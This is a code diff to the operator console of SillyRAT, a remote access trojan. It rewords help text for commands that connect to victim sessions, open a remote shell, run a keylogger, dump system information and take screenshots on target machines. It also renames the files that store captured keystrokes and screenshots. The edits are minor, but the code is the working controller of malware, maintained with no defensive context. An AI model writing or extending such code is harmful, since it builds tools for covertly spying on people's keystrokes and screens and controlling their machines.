@@ -130,13 +130,13 @@ class PULL:
     def help_c_current(self):
         headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
         lister  = [
-            ('help', 'Shows manual for commands'),
+            ('help', 'Shows manual for commands or server help'),
             ('sessions', 'Show all connected clients to the server'),
-            ('connect', 'Connect to a Specific Client'),
-            ('disconnect', 'Disconnect from Current Client'),
-            ('clear', 'Clear Screen'),
-            ('shell'  , 'Launch a New Terminal/Shell.'),
-            ('keylogger', 'KeyLogger Module'),
+            ('connect', 'Connect to a specific Client'),
+            ('disconnect', 'Disconnect from current Client'),
+            ('clear', 'Clear terminal screen'),
+            ('shell'  , 'Launch New Terminal/Shell.'),
+            ('keylogger', 'KeyLogger Module (capture keystrokes)'),
             ('sysinfo', 'Dump System, Processor, CPU and Network Information'),
             ('screenshot', 'Take Screenshot on Target Machine and Save on Local'),
             ('exit', 'Exit from SillyRAT!')
@@ -148,11 +148,11 @@ class PULL:
     def help_c_general(self):
         headers = (pull.BOLD + 'Command' + pull.END, pull.BOLD + 'Description' + pull.END)
         lister  = [
-            ('help', 'Shows manual for commands'),
+            ('help', 'Shows manual for commands or server help'),
             ('sessions', 'Show all connected clients to the server'),
-            ('connect', 'Connect to a Specific Client'),
+            ('connect', 'Connect to a specific Client'),
             ('disconnect', 'Disconnect from Current Client'),
-            ('clear', 'Clear Screen'),
+            ('clear', 'Clear terminal screen'),
             ('exit', 'Exit from SillyRAT!')
         ]
         sys.stdout.write("\n")
@@ -188,7 +188,7 @@ class PULL:
 
     def help_c_clear(self):
         sys.stdout.write("\n")
-        print("Info       : Clear screen!")
+        print("Info       : Clear terminal screen!")
         print("Arguments  : None")
         print("Example    : clear")
         sys.stdout.write("\n")
@@ -421,7 +421,8 @@ class COMMCENTER:
                     dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
                     if not os.path.isdir(dirname):
                         os.mkdir(dirname)
-                    fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") )
+                    """ fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt") ) """
+                    fullpath = os.path.join( dirname, datetime.now().strftime("keystrokes-%H:%M:%S.txt") )
                     fl = open( fullpath, 'w' )
                     fl.write( result )
                     fl.close()
@@ -454,7 +455,8 @@ class COMMCENTER:
             dirname = os.path.join( dirname, '%s' % (self.CURRENT[1].ip) )
             if not os.path.isdir(dirname):
                 os.mkdir(dirname)
-            fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") )
+            """ fullpath = os.path.join( dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.png") ) """
+            fullpath = os.path.join( dirname, datetime.now().strftime("screenshot-%H:%M:%S.png") )
             fl = open( fullpath, 'wb' )
             fl.write( result )
             fl.close()
@@ -542,7 +544,7 @@ class INTERFACE(COMMCENTER):
                 self.c_screenshot()
 
     def launch(self):
-        pull.print("Launching Interface! Enter 'help' to get avaible commands! \n")
+        pull.print("Launching Interface! Enter 'help' to get  available commands!\n")
 
         while True:
             val = pull.get_com(self.CURRENT)
